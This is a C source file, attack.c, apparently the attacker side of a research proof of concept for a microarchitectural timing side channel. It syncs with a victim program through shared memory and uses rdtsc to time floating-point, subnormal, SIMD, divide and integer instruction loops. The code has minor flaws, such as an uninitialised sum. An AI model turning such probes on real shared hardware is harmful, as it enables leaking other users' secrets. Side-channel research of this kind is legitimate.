/**
 * Compile with:
 * gcc -m64 -O3 attack.c -o attack
 */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/shm.h>
#include <time.h>
#include <unistd.h>
#define CYCLES_64 uint64_t

#define SHMSZ 4096

volatile char *shared_mem;
int shmid;

int comm_init_shared_memory()
{
	key_t key;
	key = 1313;

	shmid = shmget(key, SHMSZ, IPC_CREAT | SHM_R | SHM_W);
	if (shmid < 0) {
		printf("Attacker: shmget failed\n");
		return -1;
	}

	shared_mem = shmat(shmid, NULL, 0);
	if (shared_mem == (char *)-1) {
		printf("Attacker: Shared memory attach failure");
		shmctl(shmid, IPC_RMID, NULL);
		return -1;
	}

	return 0;
}

int comm_shutdown_shared_memory()
{
	if (shmdt((const void *)shared_mem) != 0) {
		printf("Attacker: Detach failure");
		shmctl(shmid, IPC_RMID, NULL);
		exit(-1);
	}
	shmctl(shmid, IPC_RMID, NULL);
}

CYCLES_64 read_timer();
void busy_simd(double *, double *);
void busy_simd_div(double *, double *);
void busy_fp(double *, double *);
void busy_int(uint64_t *, uint64_t *);
void idle();

double subnormalfp;
double normalfpa = 100.0;
double normalfpb = 12.0;
uint64_t inta = 100;
uint64_t intb = 45;

double *subnormalfp_ptr = &subnormalfp;
double *normalfpa_ptr = &normalfpa;
double *normalfpb_ptr = &normalfpb;
uint64_t *inta_ptr = &inta;
uint64_t *intb_ptr = &intb;

/**
 * attack.c uses shared memory to communicate with victim.c so
 * part of this code is to set that up and is not related to the
 * microscope kernel framework.
 */
int main(int argc, char *argv[])
{
	int ret = 0;
	volatile char *comm_buffer;
	uint64_t i = 0;
	if (argc < 3) {
		printf("++please provide 2 argument: <mode> [sub_fp, normal_fp, int, idle]; <number of iterations>\n");
		exit(1);
	}

	int loop_num = atoi(argv[2]);
	CYCLES_64 t1, t2;

	// buffer is an array to store the measured latencies
    // NOTE: The terminology here is confusing
	const int BUFF_SIZE = 200000;
	CYCLES_64 buffer[BUFF_SIZE];

	// construct subnormal floating point integer
	const unsigned long lnDEN[2] = {0x0000001, 0x00000000};
	const double A_DENORMAL = *(double *)lnDEN;
	subnormalfp = A_DENORMAL;

	ret = comm_init_shared_memory();
	if (ret < 0) {
		exit(-1);
	}

	comm_buffer = shared_mem;
	for (i = 0; i < SHMSZ; i++) {
		comm_buffer[i] = 'a';
	}
	
    printf("Attacker: comm_buffer[0]=%c\n", comm_buffer[0]);
	
    // Wait for the victim to be ready
    while (comm_buffer[0] != 'b') {}

	printf("Attacker: comm_buffer[0]=%c\n", comm_buffer[0]);

	for (int k = 0; k < 10; k++) {
		if (strcmp("sub_fp", argv[1]) == 0) {
			for (int z = 0; z < 100; z++)
				for (int j = 0; j < BUFF_SIZE; j++) {
					t1 = read_timer();
					for (int i = 0; i < loop_num; i++) {
						volatile double x = (*subnormalfp_ptr) * (*normalfpa_ptr);
						busy_fp(subnormalfp_ptr, normalfpa_ptr);
					}
					t2 = read_timer();
					buffer[j] = t2 - t1;
				}

		} else if (strcmp("normal_fp", argv[1]) == 0) {

			for (int z = 0; z < 100; z++)
				for (int j = 0; j < BUFF_SIZE; j++) {
					t1 = read_timer();
					for (int i = 0; i < loop_num; i++) {
						busy_fp(normalfpb_ptr, normalfpa_ptr);
					}
					t2 = read_timer();
					buffer[j] = t2 - t1;
				}

		} else if (strcmp("sub_simd", argv[1]) == 0) {

			for (int z = 0; z < 100; z++)
				for (int j = 0; j < BUFF_SIZE; j++) {
					t1 = read_timer();
					for (int i = 0; i < loop_num; i++) {
						volatile double x = (*subnormalfp_ptr) * (*normalfpa_ptr);
						busy_simd(subnormalfp_ptr, normalfpa_ptr);
					}
					t2 = read_timer();
					buffer[j] = t2 - t1;
				}

		} else if (strcmp("normal_simd", argv[1]) == 0) {

			for (int z = 0; z < 100; z++)
				for (int j = 0; j < BUFF_SIZE; j++) {
					t1 = read_timer();
					for (int i = 0; i < loop_num; i++) {
						busy_simd(normalfpb_ptr, normalfpa_ptr);
					}
					t2 = read_timer();
					buffer[j] = t2 - t1;
				}

		} else if (strcmp("sub_div", argv[1]) == 0) {

			for (int z = 0; z < 100; z++)
				for (int j = 0; j < BUFF_SIZE; j++) {
					t1 = read_timer();
					for (int i = 0; i < loop_num; i++) {
						volatile double x = (*subnormalfp_ptr) * (*normalfpa_ptr);
						busy_simd_div(subnormalfp_ptr, normalfpa_ptr);
					}
					t2 = read_timer();
					buffer[j] = t2 - t1;
				}

		} else if (strcmp("normal_div", argv[1]) == 0) {
			//printf("normal_div\n");
			for (int z = 0; z < 100; z++)
				for (int j = 0; j < BUFF_SIZE; j++) {
					t1 = read_timer();
					for (int i = 0; i < loop_num; i++) {
						busy_simd_div(normalfpb_ptr, normalfpa_ptr);
					}
					t2 = read_timer();
					buffer[j] = t2 - t1;
				}
		} else if (strcmp("int", argv[1]) == 0) {

			for (int z = 0; z < 100; z++)
				for (int j = 0; j < BUFF_SIZE; j++) {
					t1 = read_timer();
					for (int i = 0; i < loop_num; i++) {
						busy_int(inta_ptr, intb_ptr);
					}
					t2 = read_timer();
					buffer[j] = t2 - t1;
				}
		} else if (strcmp("idle", argv[1]) == 0) {

			for (int z = 0; z < 100; z++)
				for (int j = 0; j < BUFF_SIZE; j++) {
					t1 = read_timer();
					for (int i = 0; i < loop_num; i++) {
						idle();
					}
					t2 = read_timer();
					buffer[j] = t2 - t1;
				}
		} else {

			printf(
				"--please provide 2 argument: <mode> [sub_fp, normal_fp, int, idle]; "
				"<number of iterations>\n");
			exit(1);
		}

		// print out results
		uint64_t sum;
		for (int i = 0; i < BUFF_SIZE; i++) {
			if (buffer[i] > 114) {
				printf("%d %ld\n", i, buffer[i]);
			}
			sum += buffer[i];
		}

		double avg;
		avg = (double)sum / (double)BUFF_SIZE;
		// printf("%ld,", buffer[BUFF_SIZE - 10]);
		printf("%lf\n", avg);
		usleep(1000);
		// printf("\n");
	}
	return 0;
}

inline void busy_simd(double *fpa_ptr, double *fpb_ptr)
{

	asm __volatile__(
		"mov %0, %%rax\n"
		"mov %1, %%rbx\n"
		"movsd (%%rax), %%xmm0\n"
		"movsd (%%rbx), %%xmm1\n"
		"movsd %%xmm1, %%xmm2\n"
		// mulsd: Multiply Scalar Double-Precision Floating-Point Value
		// 128-bit Legacy SSE version: The first source operand
		// and the destination operand are the same.
		// NOTE: Here I make all the destinations differently.
		// While this is unneccessary, since they are false dependency
		"mulsd %%xmm0, %%xmm2\n" // mul_1
		"movsd %%xmm1, %%xmm3\n"
		"mulsd %%xmm0, %%xmm3\n" // mul_2
		"movsd %%xmm1, %%xmm4\n"
		"mulsd %%xmm0, %%xmm4\n" // mul_3
		"movsd %%xmm1, %%xmm5\n"
		"mulsd %%xmm0, %%xmm5\n" // mul_4
		"movsd %%xmm1, %%xmm6\n"
		"mulsd %%xmm0, %%xmm6\n" // mul_5
		"movsd %%xmm1, %%xmm7\n"
		"mulsd %%xmm0, %%xmm7\n" // mul_6
		"movsd %%xmm1, %%xmm8\n"
		"mulsd %%xmm0, %%xmm8\n" // mul_7
		"movsd %%xmm1, %%xmm9\n"
		"mulsd %%xmm0, %%xmm9\n" // mul_8
		"movsd %%xmm1, %%xmm10\n"
		"mulsd %%xmm0, %%xmm10\n" // mul_9
		"movsd %%xmm1, %%xmm11\n"
		"mulsd %%xmm0, %%xmm11\n" // mul_10
		:
		: "m"(fpa_ptr), "m"(fpb_ptr)
		: "%xmm0", "%xmm1", "%xmm2", "memory", "%xmm3", "%xmm4", "%xmm5", "%xmm6",
		  "%xmm7", "%xmm8", "%xmm9", "%xmm10", "%xmm11", "%rax", "%rbx");
}

inline void busy_simd_div(double *fpa_ptr, double *fpb_ptr)
{

	asm __volatile__(
		"mov %0, %%rax\n"
		"mov %1, %%rbx\n"
		"movsd (%%rax), %%xmm0\n"
		"movsd (%%rbx), %%xmm1\n"
		"movsd %%xmm1, %%xmm2\n"
		// divsd: Divide Scalar Double-Precision Floating-Point Value
		// 128-bit Legacy SSE version: The first source operand
		// and the destination operand are the same.
		// NOTE: Here I make all the destinations differently.
		// While this is unneccessary, since they are false dependency
		"divsd %%xmm0, %%xmm2\n" // mul_1
		// "movsd %%xmm1, %%xmm3\n"
		// "divsd %%xmm0, %%xmm3\n" // mul_2
		// "movsd %%xmm1, %%xmm4\n"
		// "divsd %%xmm0, %%xmm4\n" // mul_3
		// "movsd %%xmm1, %%xmm5\n"
		// "divsd %%xmm0, %%xmm5\n" // mul_4
		// "movsd %%xmm1, %%xmm6\n"
		// "divsd %%xmm0, %%xmm6\n" // mul_5
		// "movsd %%xmm1, %%xmm7\n"
		// "divsd %%xmm0, %%xmm7\n" // mul_6
		// "movsd %%xmm1, %%xmm8\n"
		// "divsd %%xmm0, %%xmm8\n" // mul_7
		// "movsd %%xmm1, %%xmm9\n"
		// "divsd %%xmm0, %%xmm9\n" // mul_8
		// "movsd %%xmm1, %%xmm10\n"
		// "divsd %%xmm0, %%xmm10\n" // mul_9
		// "movsd %%xmm1, %%xmm11\n"
		// "divsd %%xmm0, %%xmm11\n" // mul_10
		:
		// : "m"(fpa_ptr), "m"(fpb_ptr)
		// : "%xmm0", "%xmm1", "%xmm2", "memory", "%xmm3", "%xmm4", "%xmm5",
		// "%xmm6",
		//   "%xmm7", "%xmm8", "%xmm9", "%xmm10", "%xmm11", "%rax", "%rbx");
		: "m"(fpa_ptr), "m"(fpb_ptr)
		: "%xmm0", "%xmm1", "%xmm2", "memory", "%xmm3", "%xmm4", "%xmm5", "%xmm6", "%rax",
		  "%rbx");
	//"%xmm3", "%xmm4", "%xmm5"
}

inline void busy_fp(double *fpa_ptr, double *fpb_ptr)
{

	asm __volatile__("mov %0, %%rsi\n"
					 "mov %1, %%rdi\n"
					 "fldl (%%rsi)\n"
					 "fst %%st(1)\n"
					 "fldl  (%%rdi)\n" // mul1
					 "fmulp %%st(1)\n"
					 "fldl  (%%rdi)\n" // mul2
					 "fmulp %%st(1)\n"
					 "fldl  (%%rdi)\n" // mul3
					 "fmulp %%st(1)\n"
					 "fldl  (%%rdi)\n" // mul4
					 "fmulp %%st(1)\n"
					 "fldl  (%%rdi)\n" // mul5
					 "fmulp %%st(1)\n"
					 "fldl  (%%rdi)\n" // mul6
					 "fmulp %%st(1)\n"
					 "fldl  (%%rdi)\n" // mul7
					 "fmulp %%st(1)\n"
					 "fldl  (%%rdi)\n" // mul8
					 "fmulp %%st(1)\n"
					 "fldl  (%%rdi)\n" // mul9
					 "fmulp %%st(1)\n"
					 "fldl  (%%rdi)\n" // mul10
					 "fmulp %%st(1)\n"
					 :
					 : "m"(fpa_ptr), "m"(fpb_ptr)
					 : "memory", "%rsi", "%rdi", "%st", "%st(1)", "%st(2)",
					   "%st(3)", "%st(4)", "%st(5)", "%st(6)", "%st(7)");
}

inline void busy_int(uint64_t *inta_ptr, uint64_t *intb_ptr)
{

	asm __volatile__("mov %0, %%rsi\n"
					 "mov %1, %%rdi\n"
					 "mov (%%rsi), %%rbx\n"
					 "mov (%%rdi), %%rcx\n"
					 // MUL — Unsigned Multiply
					 // MUL r/m64
					 // Operand Size Source 1    Source 2    Destination
					 // Quadword     RAX         r/m64       RDX:RAX
					 "mov %%rcx, %%rax\n"
					 "mul %%rbx\n" // mul_1
					 "mov %%rcx, %%rax\n"
					 "mul %%rbx\n" // mul_2
					 "mov %%rcx, %%rax\n"
					 "mul %%rbx\n" // mul_3
					 "mov %%rcx, %%rax\n"
					 "mul %%rbx\n" // mul_4
					 "mov %%rcx, %%rax\n"
					 "mul %%rbx\n" // mul_5
					 "mov %%rcx, %%rax\n"
					 "mul %%rbx\n" // mul_6
					 "mov %%rcx, %%rax\n"
					 "mul %%rbx\n" // mul_7
					 "mov %%rcx, %%rax\n"
					 "mul %%rbx\n" // mul_8
					 "mov %%rcx, %%rax\n"
					 "mul %%rbx\n" // mul_9
					 "mov %%rcx, %%rax\n"
					 "mul %%rbx\n" // mul_10
					 :
					 : "m"(inta_ptr), "m"(intb_ptr)
					 : "memory", "%rax", "%rbx", "%rcx", "%rdx", "%rsi", "%rdi");
}

inline void idle()
{
	asm __volatile__("mov $0x1234, %%rax\n" // mov_1
					 "mov $0x1234, %%rax\n" // mov_2
					 "mov $0x1234, %%rax\n" // mov_3
					 "mov $0x1234, %%rax\n" // mov_4
					 "mov $0x1234, %%rax\n" // mov_5
					 "mov $0x1234, %%rax\n" // mov_6
					 "mov $0x1234, %%rax\n" // mov_7
					 "mov $0x1234, %%rax\n" // mov_8
					 "mov $0x1234, %%rax\n" // mov_9
					 "mov $0x1234, %%rax\n" // mov_10
					 :
					 :
					 : "%rax");
}

inline CYCLES_64 read_timer()
{
	volatile uint64_t t;
	asm __volatile__("lfence\n"
					 // Guaranteed to clear the high-order 32 bits of RAX and RDX.
					 "rdtsc\n"
					 "shlq $32, %%rdx\n"
					 "orq %%rdx, %%rax\n"
					 : "=a"(t)
					 :
					 : "%rdx");
	return t;
}
